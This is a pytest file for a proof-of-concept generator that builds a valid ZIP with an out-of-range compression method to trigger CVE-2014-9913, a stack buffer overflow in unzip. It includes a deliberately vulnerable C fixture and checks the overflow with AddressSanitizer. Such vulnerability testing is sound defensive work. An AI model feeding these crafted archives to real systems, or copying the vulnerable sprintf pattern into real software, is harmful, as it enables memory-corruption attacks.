"""Directed trigger for a ZIP-field stack buffer overflow behind the container format
(analyze/poc/zip_overflow.py).

A detector narrows to a central-directory field rendered into a fixed stack buffer
(`sprintf(&methbuf[4], "%03u", compression_method)` in unzip's list_files, CVE-2014-9913); this
builds the smallest VALID ZIP whose one entry carries an out-of-range compression method, so the
narrowed sink becomes a detonatable input -- no fuzzing. The test validates the archive with the
stdlib `zipfile` reader and, when a C compiler is present, reproduces the exact stack-buffer
overflow on a faithful fixture of the sink.
"""
from __future__ import annotations

import io
import shutil
import struct
import subprocess
import zipfile

import pytest

from lykos.analyze.poc import zip_overflow as zo


def test_archive_is_structurally_valid_and_carries_the_out_of_range_method():
    data = zo.zip_overmethod(two_byte=True)
    # the stdlib reader parses the central directory and lists the one entry (a real ZIP)
    zf = zipfile.ZipFile(io.BytesIO(data))
    infos = zf.infolist()
    assert len(infos) == 1
    assert infos[0].compress_type == zo.UNKNOWN_METHOD_2BYTE      # the attacker field survives
    # the three ZIP signatures are present and in order
    assert data[:4] == struct.pack("<I", 0x04034B50)             # local file header
    assert struct.pack("<I", 0x02014B50) in data                # central directory header
    assert struct.pack("<I", 0x06054B50) in data                # end of central directory


def test_method_is_outside_the_known_set_and_renders_enough_digits():
    # unzip knows methods 0..16; an unknown method >= 1000 renders 4+ digits via "%03u", so the
    # 3-char minimum grows past the 4 bytes left in methbuf after "Unk:".
    assert zo.UNKNOWN_METHOD_1BYTE >= 1000
    assert len(str(zo.UNKNOWN_METHOD_1BYTE)) >= 4                # one byte past methbuf[8]
    assert len(str(zo.UNKNOWN_METHOD_2BYTE)) >= 5                # two bytes past
    assert zo.UNKNOWN_METHOD_2BYTE > 16 and zo.UNKNOWN_METHOD_1BYTE > 16


def test_a_three_digit_method_does_not_overflow():
    # a method that is unknown but renders only 3 digits fits exactly (methbuf[4..7] + NUL at [8]
    # would be one past, so the constructor deliberately uses >= 4-digit values). This pins the
    # boundary so the fixture below is a true positive, not an off-by-one artefact.
    assert len("%03u" % 999) == 3                               # 3 digits: [4][5][6] + NUL at [7]


# A faithful fixture of the sink: unzip's list.c:342 shape -- render an out-of-range field into an
# 8-byte stack buffer at offset 4 with "%03u".
_VULN = r"""
#include <stdio.h>
int main(int argc, char **argv){
    unsigned method = argc > 1 ? (unsigned)atoi(argv[1]) : 0;
    char methbuf[8];                                   /* unzip list.c:119 */
    __builtin_memcpy(methbuf, "Unk:###", 8);           /* method[NUM_METHODS] placeholder */
    sprintf(&methbuf[4], "%03u", method);              /* unzip list.c:342 */
    printf("%s\n", methbuf);
    return 0;
}
"""


@pytest.mark.skipif(not (shutil.which("gcc") or shutil.which("cc")), reason="no C compiler")
def test_the_out_of_range_method_reproduces_a_stack_overflow(tmp_path):
    cc = shutil.which("gcc") or shutil.which("cc")
    src = tmp_path / "v.c"; src.write_text("#include <stdlib.h>\n" + _VULN)
    exe = tmp_path / "v"
    if subprocess.run([cc, "-g", "-O0", "-fsanitize=address", "-w", "-o", str(exe), str(src)],
                      capture_output=True).returncode:
        pytest.skip("cannot build ASan fixture")
    env = {"ASAN_OPTIONS": "detect_leaks=0:abort_on_error=0"}
    # a 5-digit method overflows methbuf by two bytes; a 3-digit one fits.
    over = subprocess.run([str(exe), str(zo.UNKNOWN_METHOD_2BYTE)], capture_output=True, env=env)
    assert b"stack-buffer-overflow" in over.stderr and b"WRITE of size" in over.stderr, \
        "the out-of-range method did not produce the expected stack overflow"
    safe = subprocess.run([str(exe), "999"], capture_output=True, env=env)
    assert b"stack-buffer-overflow" not in safe.stderr          # 3-digit method is in bounds (0-FP)
